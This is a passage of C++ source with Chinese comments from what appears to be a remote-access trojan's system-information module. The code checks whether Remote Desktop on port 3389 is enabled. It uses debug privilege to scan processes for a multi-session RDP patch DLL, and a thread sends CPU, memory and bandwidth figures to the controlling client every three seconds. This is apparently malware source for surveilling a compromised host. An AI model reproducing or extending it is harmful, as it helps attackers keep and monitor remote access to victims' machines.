					HANDLE hProcessSnap= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
					//查找相关的进程
					if(Process32First(hProcessSnap, &pe32))
					{
						do
						{
							HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, strDll);
							if (hModuleHandle != NULL)
							{
								bRet = TRUE;
								break;
							}
						}while (Process32Next(hProcessSnap,&pe32));
					}
					CloseHandle(hProcessSnap);
					DebugPrivilege(SE_DEBUG_NAME, FALSE);
					if (bRet)
					{
						wsprintf(pSysInfo->szOpenInfo, _T("已开启且已双开"));
						return;
					}
					else
					{
						wsprintf(pSysInfo->szOpenInfo, _T("已开启但未双开"));
						return;
					}
				}
				else
				{
					wsprintf(pSysInfo->szOpenInfo, _T("已开启但未双开"));
					return;
				}
			}
			else
			{
				wsprintf(pSysInfo->szOpenInfo, _T("已开启且无需双开"));
				return;
			}
		}
		else
		{
			wsprintf(pSysInfo->szOpenInfo, _T("未允许连接3389"));
			return;
		}
	}
	else
	{
		wsprintf(pSysInfo->szOpenInfo, _T("未开启3389服务"));
	}
	//////////////////////////////////////////////////////////////////////////
}

__int64 CompareFileTime ( FILETIME time1, FILETIME time2 )   
{   
	__int64 a = time1.dwHighDateTime << 32 | time1.dwLowDateTime ;   
	__int64 b = time2.dwHighDateTime << 32 | time2.dwLowDateTime ;   
	
	return   (b - a);   
}   

int GetCPUOcupPerc()   
{   
	HMODULE hModule_Kernel32 = LoadLibrary("kernel32.dll");
	typedef BOOL (WINAPI *TGetSystemTimes)(LPFILETIME,LPFILETIME,LPFILETIME); 
	TGetSystemTimes MyGetSystemTimes = (TGetSystemTimes) GetProcAddress(hModule_Kernel32, "GetSystemTimes");
	
    HANDLE hEvent;   
    BOOL res ;   
	
    FILETIME preidleTime;   
    FILETIME prekernelTime;   
    FILETIME preuserTime;   
	
    FILETIME idleTime;   
    FILETIME kernelTime;   
    FILETIME userTime;   
	
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    preidleTime = idleTime;   
    prekernelTime = kernelTime;   
    preuserTime = userTime ;   
	
    Sleep(1000);
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    int idle = CompareFileTime( preidleTime,idleTime);   
    int kernel = CompareFileTime( prekernelTime, kernelTime);   
    int user = CompareFileTime(preuserTime, userTime);   
	
    int cpu = (kernel +user - idle) *100/(kernel+user);   
	
	if (hModule_Kernel32)
		FreeLibrary(hModule_Kernel32);
	
    return cpu;   
}   

int GetMemOcpuPerc()   
{   
	MEMORYSTATUSEX statex;   
	
	statex.dwLength = sizeof (statex);   
	
	GlobalMemoryStatusEx (&statex);   
	
	return (int)statex.dwMemoryLoad;   
} 


DWORD dwLastIn  = 0;   
DWORD dwLastOut = 0;   
DWORD dwBandIn  = 0;   
DWORD dwBandOut = 0;   
DWORD dwLastIn1[5]  = {0, 0};
DWORD dwLastOut1[5] = {0, 0};

bool GetBandOut(DWORD &dwBandoutBytes,DWORD &dwBandInputBytes)
{

	//获取网络适配器数量
	PMIB_IFTABLE pTable = NULL;   
	DWORD dwAdapters = 0;   
	ULONG uRetCode = GetIfTable(pTable, &dwAdapters, TRUE);   
	if (ERROR_NOT_SUPPORTED == uRetCode)   
	{
		return false;   
	}   
	else if (ERROR_INSUFFICIENT_BUFFER == uRetCode)   
	{   
		pTable = (PMIB_IFTABLE)new BYTE[dwAdapters];   
	}   
	
	//获取适配器数据
	DWORD dwRet = GetIfTable(pTable, &dwAdapters, TRUE);
	if (NO_ERROR != dwRet)
	{
		return false;
	}
	
	//解析适配器数据，获取流量信息
	DWORD dwInOctets = 0;   
	DWORD dwOutOctets = 0;   
	for (UINT i = 0; i < pTable->dwNumEntries; i++)   
	{//分别统计每个网卡数据   
		MIB_IFROW Row = pTable->table[i];   
		
		//获取下载数据
		DWORD dwBandIn1 = 0;
		if (dwLastIn1[i] <= 0)
			dwBandIn1 = 0;
		else
			dwBandIn1 = (Row.dwInOctets - dwLastIn1[i]);
		
		//获取上传数据
		DWORD dwBandOut1 = 0;
		if (dwLastOut1[i] <= 0)
			dwBandOut1 = 0;
		else
			dwBandOut1 = Row.dwOutOctets - dwLastOut1[i];
		
		dwLastIn1[i] = Row.dwInOctets;
		dwLastOut1[i] = Row.dwOutOctets;
		
		//统计总的数据
		dwInOctets += Row.dwInOctets;   
		dwOutOctets += Row.dwOutOctets;   
	}   
	
	dwBandIn = dwInOctets - dwLastIn;   
	dwBandOut = dwOutOctets - dwLastOut;   
	if (dwLastIn <= 0)   
	{   
		dwBandIn = 0;   
	}   
	else   
	{   
		dwBandIn = dwBandIn;   
	}   
	
	if (dwLastOut <= 0)   
	{   
		dwBandOut = 0;   
	}   
	else   
	{   
		dwBandOut = dwBandOut;   
	}   
	
	dwLastIn = dwInOctets;   
	dwLastOut = dwOutOctets;   
	
	dwBandoutBytes = dwBandOut; //上传

	dwBandInputBytes = dwBandIn; //下载

	if (bFirst)
	{
		bFirst = FALSE;
	}
	else
	{
		DWORD dwMiSeconds = GetTickCount() - m_dwStartMiSeconds;
		DWORD dwMiSeconds1 = GetTickCount() - m_dwStartMiSeconds1;
		
 		dwMiSeconds1 = dwMiSeconds1 < 0 ? 1000 : dwMiSeconds1;
 		dwBandInputBytes = dwBandInputBytes * 1000 / dwMiSeconds1;
		
		dwMiSeconds = dwMiSeconds < 0 ? 1000 : dwMiSeconds;
		dwBandoutBytes = dwBandoutBytes * 1000 / dwMiSeconds;		
	}

	m_dwStartMiSeconds1 = GetTickCount();
	m_dwStartMiSeconds = GetTickCount();
	delete  []pTable;   
	
	return true;
}

DWORD WINAPI CSysteminfoManager::SendCPUAndMemoryThread(LPVOID lparam)
{
/*
		CSysteminfoManager *pThis = (CSysteminfoManager *)lparam;
		
		
		BYTE buf[20];
		while (pThis->m_pClient->IsRunning())
		{          
			Sleep(1000 * 3);
			
			ZeroMemory(buf,20);
			buf[0] = TOKEN_CPUMEMORY;
			
			int Mem = GetMemOcpuPerc();
			int cpu = GetCPUOcupPerc();
	
			DWORD Upload =0, Down =0;
			GetBandOut(Upload,Down);
			memcpy(buf+1,(void*)&Mem,sizeof(DWORD));   //内存
			memcpy(buf+1+sizeof(DWORD),(void*)&cpu,sizeof(DWORD));
	
			memcpy(buf+1+sizeof(DWORD),(void*)&Upload,sizeof(DWORD)); //带宽
			memcpy(buf+1+sizeof(DWORD),(void*)&Down,sizeof(DWORD)); //带宽
	
			pThis->Send((unsigned char *)buf,sizeof(buf));
		}
		
		return true;*/
	CSysteminfoManager *pThis = (CSysteminfoManager *)lparam;
	
	tagSysstatus Sysstatus;
	BYTE buf[50];
	
	while (pThis->m_pClient->IsRunning())
	{          
		Sleep(1000 * 3);
		
		ZeroMemory(buf,50);
		buf[0] = TOKEN_CPUMEMORY;
		
		Sysstatus.Mem = GetMemOcpuPerc();
		Sysstatus.cpu = GetCPUOcupPerc();
		
		GetBandOut(Sysstatus.Bandout,Sysstatus.Bandout_B); //获取上下行宽带
		
	
		memcpy(buf+1,&Sysstatus,sizeof(Sysstatus));   //内存
		
		
		pThis->Send(buf,sizeof(buf));
	}
	
	return true;
}